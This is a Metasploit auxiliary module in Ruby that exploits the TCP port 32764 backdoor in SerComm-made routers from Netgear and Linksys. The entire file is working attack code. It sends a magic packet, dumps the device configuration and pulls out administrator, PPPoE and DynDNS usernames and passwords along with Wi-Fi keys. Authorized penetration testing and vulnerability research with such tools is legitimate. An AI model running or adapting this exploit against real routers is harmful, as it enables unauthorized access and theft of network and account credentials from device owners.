require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SerComm Device Configuration Dump",
      'Description'    => %q{
          This module will dump the configuration of several SerComm devices. These devices
          typically include routers from NetGear and Linksys.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>',   #Initial discovery, poc
          'Matt "hostess" Andreko <mandreko[at]accuvant.com>',  #Msf module
        ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ],
        ],
      'DisclosureDate' => "Dec 31 2013" ))

      register_options(
        [
          Opt::RPORT(32764),
        ], self.class)
  end

  def run

    print_status("Attempting to connect to #{rhost} to dump configuration.")

    connect

    data = [0x53634d4d, 0x01, 0x00].pack("VVV")
    sock.put(data)
    junk = sock.get_once # The MMcS text shows up again for some reason
    response = sock.get(3, 3)

    disconnect

    if response.nil? or response.empty?
      print_status("No response from server")
      return
    end

    print_status(response) if( datastore['DEBUG'] )

    loot_file = store_loot("router.config", "text/plain", datastore['RHOST'], response, "#{datastore['RHOST']}router_config.txt", "Router Configurations")
    print_status("Router configuration dump stored in: #{loot_file}")

    configs = response.split(?\x00)
    configs.sort.each do |i|
      if i.strip.match(/.*=\S+/)
        print_status(i) if (datastore['DEBUG'])
      end
    end

    # print some useful data sets
    [
      [/http_username=(\S+)/i, "HTTP Username"],
      [/http_password=(\S+)/i, "HTTP Password"],
      [/pppoe_username=(\S+)/i, "PPPOE Username"],
      [/pppoe_password=(\S+)/i, "PPPOE Password"],
      [/ddns_service_provider=(\S+)/i, "DynDNS Provider"],
      [/ddns_user_name=(\S+)/i, "DynDNS Username"],
      [/ddns_password=(\S+)/i, "DynDNS Password"],
      [/wifi_ssid=(\S+)/i, "Wifi SSID"],
      [/wifi_key1=(\S+)/i, "Wifi Key1"],
      [/wifi_key2=(\S+)/i, "Wifi Key2"],
      [/wifi_key3=(\S+)/i, "Wifi Key3"],
      [/wifi_key4=(\S+)/i, "Wifi Key4"]
    ].each do |regex|
      configs.each do |config|
        if config.match(regex[0])
          value = $1
          print_status("#{regex[1]}: #{value}")
        end
      end
    end
  end
end
